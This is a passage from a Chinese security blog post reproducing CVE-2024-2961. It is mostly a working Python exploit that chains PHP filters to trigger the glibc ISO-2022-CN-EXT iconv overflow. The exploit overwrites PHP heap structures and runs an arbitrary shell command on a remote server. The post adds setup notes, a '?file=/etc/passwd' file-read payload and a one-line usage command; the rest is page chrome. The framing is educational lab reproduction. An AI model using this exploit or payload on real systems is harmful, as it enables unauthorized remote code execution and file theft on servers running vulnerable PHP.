+    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+
+    CS = 0x100
+
+    # Pad needs to stay at size 0x100 at every step
+    pad_size = CS - 0x18
+    pad = b&quot;\x00&quot; * pad_size
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = chunked_chunk(pad, len(pad) + 6)
+    pad = compressed_bucket(pad)
+
+    step1_size = 1
+    step1 = b&quot;\x00&quot; * step1_size
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1)
+    step1 = chunked_chunk(step1, CS)
+    step1 = compressed_bucket(step1)
+
+    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
+    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;
+
+    step2_size = 0x48
+    step2 = b&quot;\x00&quot; * (step2_size + 8)
+    step2 = chunked_chunk(step2, CS)
+    step2 = chunked_chunk(step2)
+    step2 = compressed_bucket(step2)
+
+    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
+    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+    step2_write_ptr = chunked_chunk(step2_write_ptr)
+    step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+    step3_size = CS
+
+    step3 = b&quot;\x00&quot; * step3_size
+    assert len(step3) == CS
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = chunked_chunk(step3)
+    step3 = compressed_bucket(step3)
+
+    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
+    assert len(step3_overflow) == CS
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = chunked_chunk(step3_overflow)
+    step3_overflow = compressed_bucket(step3_overflow)
+
+    step4_size = CS
+    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = chunked_chunk(step4)
+    step4 = compressed_bucket(step4)
+
+    # This chunk will eventually overwrite mm_heap-&gt;free_slot
+    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
+    step4_pwn = ptr_bucket(
+        0x200000,
+        0,
+        # free_slot
+        0,
+        0,
+        ADDR_CUSTOM_HEAP,  # 0x18
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        ADDR_HEAP,  # 0x140
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        size=CS,
+    )
+
+    step4_custom_heap = ptr_bucket(
+        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+    )
+
+    step4_use_custom_heap_size = 0x140
+
+    COMMAND = self.command
+    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
+    if self.sleep:
+        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
+    COMMAND = COMMAND.encode() + b&quot;\x00&quot;
+
+    assert (
+        len(COMMAND) &lt;= step4_use_custom_heap_size
+    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
+    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)
+
+    step4_use_custom_heap = COMMAND
+    step4_use_custom_heap = qpe(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+
+    pages = (
+        step4 * 3
+        + step4_pwn
+        + step4_custom_heap
+        + step4_use_custom_heap
+        + step3_overflow
+        + pad * self.pad
+        + step1 * 3
+        + step2_write_ptr
+        + step2 * 2
+    )
+
+    resource = compress(compress(pages))
+    resource = b64(resource)
+    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;
+
+    filters = [
+        # Create buckets
+        &quot;zlib.inflate&quot;,
+        &quot;zlib.inflate&quot;,
+        
+        # Step 0: Setup heap
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 1: Reverse FL order
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 2: Put fake pointer and make FL order back to normal
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+        
+        # Step 3: Trigger overflow
+        &quot;dechunk&quot;,
+        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
+        
+        # Step 4: Allocate at arbitrary address and change zend_mm_heap
+        &quot;convert.quoted-printable-decode&quot;,
+        &quot;convert.iconv.latin1.latin1&quot;,
+    ]
+    filters = &quot;|&quot;.join(filters)
+    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;
+
+    return path
+
+@inform(&quot;Triggering...&quot;)
+def exploit(self) -&gt; None:
+    path = self.build_exploit_path()
+    start = time.time()
+
+    try:
+        #这里的path根据需要进行修改触发
+        self.remote.send(path)
+    except (ConnectionError, ChunkedEncodingError):
+        pass
+    
+    msg_print()
+    
+    if not self.sleep:
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
+    elif start + self.sleep &lt;= time.time():
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
+    else:
+        # Wrong heap, maybe? If the exploited suggested others, use them!
+        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
+    
+    msg_print()
+</code></pre>
+<p>def compress(data) -&gt; bytes:<br>
+“”“Returns data suitable for <code>zlib.inflate</code>.<br>
+“””<br>
+# Remove 2-byte header and 4-byte checksum<br>
+return zlib.compress(data, 9)[2:-4]</p>
+<p>def b64(data: bytes, misalign=True) -&gt; bytes:<br>
+payload = base64.encode(data)<br>
+if not misalign and payload.endswith(“=”):<br>
+raise ValueError(f&quot;Misaligned: {data}&quot;)<br>
+return payload.encode()</p>
+<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>
+“”“Returns a chunk of size 0x8000 that, when dechunked, returns the data.”“”<br>
+return chunked_chunk(data, 0x8000)</p>
+<p>def qpe(data: bytes) -&gt; bytes:<br>
+“”“Emulates quoted-printable-encode.<br>
+“””<br>
+return “”.join(f&quot;={x:02x}&quot; for x in data).upper().encode()</p>
+<p>def ptr_bucket(*ptrs, size=None) -&gt; bytes:<br>
+“”“Creates a 0x8000 chunk that reveals pointers after every step has been ran.”“”<br>
+if size is not None:<br>
+assert len(ptrs) * 8 == size<br>
+bucket = b&quot;&quot;.join(map(p64, ptrs))<br>
+bucket = qpe(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = chunked_chunk(bucket)<br>
+bucket = compressed_bucket(bucket)</p>
+<pre><code>return bucket
+</code></pre>
+<p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:<br>
+“”“Constructs a chunked representation of the given chunk. If size is given, the<br>
+chunked representation has size <code>size</code>.<br>
+For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>
+“””<br>
+# The caller does not care about the size: let’s just add 8, which is more than<br>
+# enough<br>
+if size is None:<br>
+size = len(data) + 8<br>
+keep = len(data) + len(b&quot;\n\n&quot;)<br>
+size = f&quot;{len(data):x}“.rjust(size - keep, “0”)<br>
+return size.encode() + b”\n&quot; + data + b&quot;\n&quot;</p>
+<p>@dataclass<br>
+class Region:<br>
+“”“A memory region.”“”</p>
+<pre><code>start: int
+stop: int
+permissions: str
+path: str
+
+@property
+def size(self) -&gt; int:
+    return self.stop - self.start
+</code></pre>
+<p>Exploit()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">需要安装的依赖：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>pip install pwntools<br>
+pip install <a target="_blank" rel="noopener" href="https://github.com/cfreal/ten/archive/refs/heads/main.zip">https://github.com/cfreal/ten/archive/refs/heads/main.zip</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">去vulhub下载一个docker-compose.yml部署，或者自己部署一个，把index.php改成这个：</span><br><span class="line"></span><br><span class="line">&#123;%asset_img 5.png awa%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>?file=/etc/passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以读取`/etc/passwd`文件。</span><br><span class="line"></span><br><span class="line">使用payload：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>python <a target="_blank" rel="noopener" href="http://exp.py">exp.py</a> url “command”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">由于我的docker是在本机(windows)上开的，所以我打算在docker内部安装并且执行`exp.py`，此时又要将一些安装python3和pip的小知识了：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>apt-get update<br>
+apt-get install -y python3</p>
+<pre class="highlight"><code class>
+安装完之后就能用python3了
+
+一键利用：
+
+&#123;%asset_img 6.png awa%&#125;
+
+&#123;%asset_img 7.png awa%&#125;
+</code></pre>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/28510.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/28510.html";
+            const title         = "「真正的from LFI to RCE——CVE-2024-2961」";
+            const excerpt       = `重新拾起被曾经被我忽视掉的漏洞——CVE-2024-2961`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-09-09T10:23:15.876Z" itemprop="dateModified">最后编辑：2024-09-09</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 羊城杯2024web方向题解与复现" href="/posts/3830.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/28510.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                75
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                14
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/28510.html"><i class="fa  fa-book"></i> 真正的from LFI to RCE——CVE-2024-2961</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/3830.html"><i class="fa  fa-book"></i> 羊城杯2024web方向题解与复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/17365.html"><i class="fa  fa-book"></i> Secret</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/25143.html"><i class="fa  fa-book"></i> 巅峰极客2024部分题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/12526.html"><i class="fa  fa-book"></i> TFCCTF2024 web方向部分题解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
